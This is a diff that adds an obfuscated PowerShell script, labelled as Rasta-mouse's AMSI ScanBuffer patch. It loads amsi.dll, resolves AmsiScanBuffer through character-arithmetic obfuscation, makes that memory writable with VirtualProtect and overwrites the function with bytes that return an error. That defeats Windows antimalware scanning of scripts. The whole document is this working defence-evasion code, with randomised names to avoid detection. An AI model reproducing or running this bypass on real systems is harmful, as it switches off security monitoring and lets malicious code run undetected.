@@ -1,0 +1,28 @@
+#Rasta-mouses Amsi-Scan-Buffer patch \n
+$jANE = @"
+using System;
+using System.Runtime.InteropServices;
+public class jANE {
+    [DllImport("kernel32")]
+    public static extern IntPtr GetProcAddress(IntPtr Ekj5SpMJxc65, string MnFxfrdqM);
+    [DllImport("kernel32")]
+    public static extern IntPtr LoadLibrary(string name);
+    [DllImport("kernel32")]
+    public static extern bool VirtualProtect(IntPtr nNsj, UIntPtr _ZS8UG2CoxBFUEZAb, uint byhzxXUHWdjO2y_, out uint mFIJPGgqS7rpewFNb);
+}
+"@
+
+Add-Type $jANE
+
+$UFjUDQUUZXEGN = [jANE]::LoadLibrary("$(('àm'+'sî'+'.d'+'ll').NOrmALIze([CHAr](70*50/50)+[cHAr]([byTe]0x6f)+[ChAR](114+48-48)+[cHAr](109+102-102)+[CHAr](1+67)) -replace [ChAR]([bYte]0x5c)+[chAr](112+19-19)+[cHAR]([bYtE]0x7b)+[CHaR](77+39-39)+[CHAr]([Byte]0x6e)+[cHaR]([bYTe]0x7d))")
+$OC0w = [jANE]::GetProcAddress($UFjUDQUUZXEGN, "$([cHAR](65)+[chaR](109*52/52)+[CHAR]([ByTE]0x73)+[cHAR]([BytE]0x69)+[chAr](83*40/40)+[CHAr](99+20-20)+[cHar]([BytE]0x61)+[chaR](31+79)+[CHAR]([BytE]0x42)+[Char](117+61-61)+[CHAr](37+65)+[ChAR](13+89)+[ChaR](101*72/72)+[cHaR](50+64))")
+$p = 0
+[jANE]::VirtualProtect($OC0w, [uint32]5, 0x40, [ref]$p)
+$oTupgtnaGmtR = "0xB8"
+$B_6dHEwSY = "0x57"
+$vJx_hc3mCc6HXyI = "0x00"
+$GxdVeoleeVVOPoqYWOs = "0x07"
+$JZW19rcjPz = "0x80"
+$YGpWyLUlKaJu7a = "0xC3"
+$bexxeGCHyBj_vq = [Byte[]] ($oTupgtnaGmtR,$B_6dHEwSY,$vJx_hc3mCc6HXyI,$GxdVeoleeVVOPoqYWOs,+$JZW19rcjPz,+$YGpWyLUlKaJu7a)
+[System.Runtime.InteropServices.Marshal]::Copy($bexxeGCHyBj_vq, 0, $OC0w, 6)
